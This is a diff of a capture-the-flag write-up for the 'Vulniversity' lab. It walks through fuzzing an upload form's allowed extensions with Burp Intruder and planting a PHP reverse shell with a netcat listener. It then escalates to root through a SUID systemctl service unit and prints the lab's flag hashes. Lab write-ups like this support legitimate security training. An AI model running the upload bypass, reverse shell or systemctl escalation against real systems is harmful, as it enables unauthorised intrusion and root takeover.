@@ -173,24 +173,24 @@ Create a text file 'phpext.txt' with common PHP extensions :
 Start BurpSuite and configure the proxy to intercept the traffic from http://10.10.170.87:3333/internal/
 
 Upload a .php file, capture it in Burp proxy and forward it to the intruder :
-![alt-title](/images/Vulniversity1.png)
+![alt-title](/Vulniversity1.png)
 
 Click on 'Payloads' tab and select the 'Sniper' attack :
-![alt-title](/images/Vulniversity2.png)
+![alt-title](/Vulniversity2.png)
 
 Then, click on the 'Positions' tab and modify the captured HTTP request like that :
-![alt-title](/images/Vulniversity3.png)
+![alt-title](/Vulniversity3.png)
 
 and launch the attack.
 Check the results, by clicking on the 'Response' tab :
-![alt-title](/images/Vulniversity4.png)
-![alt-title](/images/Vulniversity5.png)
+![alt-title](/Vulniversity4.png)
+![alt-title](/Vulniversity5.png)
 
 Download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and replace the line `$ip = '127.0.0.1';  // CHANGE THIS` with the IP of the attack machine.
 
 Save the modified reverse PHP shell to 'php-reverse-shell.phtml' so that it is accepted by the upload form.
 
-Start listening to incoming connections using netcat : nc -lvnp 1234
+Start listening to incoming connections using netcat : `nc -lvnp 1234`
 
 Upload 'php-reverse-shell.phtml' and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml
 This will execute the payload and will give a reverse shell :
@@ -199,19 +199,54 @@ This will execute the payload and will give a reverse shell :
 #### What is the name of the user who manages the webserver ?
   
 > whoami
+>   
 > www-data
 > 
 > pwd
-> /
-> dir /home
-> bill
 > 
+> /
+> 
+> dir /home
+> 
+> bill
+  
+#### What is the user flag ?
 > dir /home/bill
+> 
 > user.txt
 > 
 > cat /home/bill/user.txt
+> 
 > 8bd7992fbe8a6ad22a63361004cfcedb
 
 
 ## Task 5 : Privilege escalation
 
+#### On the system, search for all SUID files. What file stands out?
+`find / -type f -user root -perm -4000 -exec ls -ldb {} \;`
+> /bin/systemctl
+
+#### Become root and get the last flag (/root/root.txt)
+Search for 'systemctl' on https://gtfobins.github.io/
+
+As per the entry "SUID", enter the script below in the elevated bash :
+
+> TF=$(mktemp).service
+>   
+> echo '[Service]
+>   
+> Type=oneshot
+>   
+> ExecStart=/bin/sh -c **"cat /root/root.txt > /tmp/output"**
+>   
+> [Install]
+>   
+> WantedBy=multi-user.target' > $TF
+> 
+> ./systemctl link $TF
+> 
+> ./systemctl enable --now $TF
+
+Then, `cat /tmp/output`
+  
+> a58ff8579f0a9270368d33a9966c7fd5
